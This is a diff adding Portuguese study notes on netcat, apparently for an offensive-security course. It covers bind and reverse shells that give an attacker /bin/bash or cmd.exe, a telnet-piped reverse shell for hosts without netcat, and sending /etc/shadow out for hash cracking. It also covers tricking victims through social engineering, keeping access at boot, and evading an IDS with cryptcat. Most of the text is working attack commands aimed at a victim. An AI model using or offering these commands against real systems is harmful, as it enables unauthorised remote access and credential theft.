@@ -1,0 +1,128 @@
+Netcat - O canivete suiço TCP
+-Permite ser usado como cliente e servidor
+
+Uso basico:
+
+testa conexão na porta 80 do host
+nc 192.168.0.1 80
+
+Abrir uma porta e esperar conexão em modo verbose
+nc -l -p 4000 -v
+ 
+O outro host fara a conexão, seja pelo telnet ou netcat (nc) na porta especificada, e mantera a conexão
+-Enquanto a conexão esta mantida, pode haver comunicação como se fosse um chat no terminal
+
+nc servidor 4000
+
+No netcat, pode se manipular arquivos de uma ponta a outra, e até executar comandos e ganhar o shell 
+-------------------------------
+Bind Shell - Backdoor com netcat (Conexão direta)
+-Pode manter conexão com a vitima e executar comandos, ou qualquer outro tipo de ataque no shell
+-Para isso, conceguir que a vitima execute o comando para escutar determinada porta e executar o shell
+-Usar criatividade: Via script, injeção de codigo, falha backdoor vsftpd e etc
+
+Escutar porta na vitima e executar o shell na conexão
+nc -l 4000 -p -e /bin/bash -v
+
+Atacante se conecta na vitima e ganha o shell
+nc IP_VITIMA 4000
+
+OBS: Hj as maquinas em rede externa não possuem IPs publicos para seus computadores pessoais
+
+OBS:###No ataque acima, quem tinha o IP publico era a vitima, portanto é um cenario dificil hoje em dia.
+        No ataque reverso, quem precisa ter o IP publoco é o atacante
+    
+Reverse shell - Conexão reversa
+
+Pré requisitos:
+-Para conseguir conexão reversa, é necessario configurar no roteador o redirecionamento de portas
+-ir nas opções avançadas do roteador e habilitar o port fowarding
+-Adicionar o IP do kali (Atacante) e a Porta para utilização do backdoor
+-Pode usar tambem o DMZ Host (Host exposto na internet) - É como se a maquina tivesse completamente exposta na internet
+-O IP publico hoje em dias, as operadoras mudam dinamicamente, portanto é necessario usar DNS Dinamico
+-Verificar se no Modem ha opção de DNS Dinamico (DDNS)
+-Melhor opção é usar DDNS "NO-IP" para manter um nome fixo e atrelar ao seu IP, mesmo que dinamico.
+    É necessario fazer cadastro no site e baixar o client DDNS
+    
+
+Fazendo o shell reverso:
+No atacante (Servidor) - O Atacante fica aguardando uma conexão
+nc -nlp 4000 -v
+
+Na vitima (Conecta na porta 4000 do atacante e prove o bash para o servidor):
+nc IP_DO_SERVIDOR 4000 -e /bin/bash
+    OBS: Para manter acesso efetivamente, seria necessario ativar o comando acima na vitima, no boot do sistema.
+-----------------------------------
+
+Diferença entre a conexão reversa e direta;
+
+Na conexão direta, o atacante precisa aguardar a conexão da vitima para se conectar, alem de precisar descobrir o IP da vitima.
+
+Na conexão Reversa, o atacante mantem a conexão e não necessita descobrir o IP da vitima, pois será a vitima quem se conectara ao servidor (Atacante)
+
+-------------------------------------
+
+Exemplo no Windows:
+
+nc IP_DO_SERVIDOR 4000 -e c:\windows\system32\cmd.exe
+  OBS: É importante que a maquina Windows possua o netcat
+  
+ ---------------------------------------
+ 
+ O administrador de sistema pode ter removido o netcat por motivo de segurança, para executar o shell reverso nesse caso, podemos fazer outro metodo:
+ 
+ No atacante, trabalhar com 2 portas (Dois terminais abertos tambem)
+ 
+ nc -vnlp 4000
+ nc -vnlp 5000
+    
+ Na vitima:
+ 
+ telnet IP_DO_ATACANTE 4000 | /bin/bash | telnet IP_DO_ATACANTE 5000
+  OBS: No caso acima, foram abertas duas portas no atacante, aonde em uma porta (4000) sera digitado os comandos /bin/bash e em outra porta (5000) sera enviado os resultados do comando.
+ 
+Explicação:  
+-No shell da vitima, o telnet abrira uma comunicação na porta 4000
+-A conexão é redirecionada para o /bin/bash (Dara o shell para o atacante)
+-O shell sera redirecionado para outra conexão na porta 5000, aonde a saida dos comandos digitados serão exibidas
+    
+    
+Essa tecnica pode ser usada com engenharia social (Ajudando alguem e pedindo para executar essa conexao para testar algo)
+----------------------------------------------
+
+Copiando arquivos com o netcat:
+
+Abre conexão na porta 5000 e aguarda para receber o arquivo que sera enviado no fechamento da conexão
+nc -vnlp 5000 > arquivo.txt
+
+Fecha a conexão e envia arquivos ou comandos:
+nc IP_DO_RECEPTOR 5000 < senhas.txt
+
+  OBS: pode ser usado em arquivos importantes como: /etc/passwd e /etc/shadow, para capturar usuarios de sistema e possiveis hashs de senhas, para quebrar posteriormente
+ 
+Éssa tecnica pode ser utilizada para transferencia rapida de arquivos, ou até para invasão de paginas Web, modificando por exemplo o index.html, ou addicionar codigo malicioso
+-Pode até mesmo copiar programas
+-------------------------------------------
+
+problema que pode haver com o netcat
+-Sistema de IDS identificar trafego suspeito
+
+cryptcat = igual ao netcat e com as mesmas opções, porem com criptografia no trafego
+
+Como burlar:
+-Enviar o cryptcat para a maquina alvo
+
+Localizar o executavel do programa (locate cryptcat/ whereis cryptcat)
+Enviando o cryptcat para a maquina alvo:
+nc -nvlp 4000 < /bin/cryptcat
+
+Alvo recebe o cryptcat:
+nc IP_ATACANTE 4000 > cryptcat            
+                                           
+    
+    
+ 
+ 
+ 
+ 
+ 
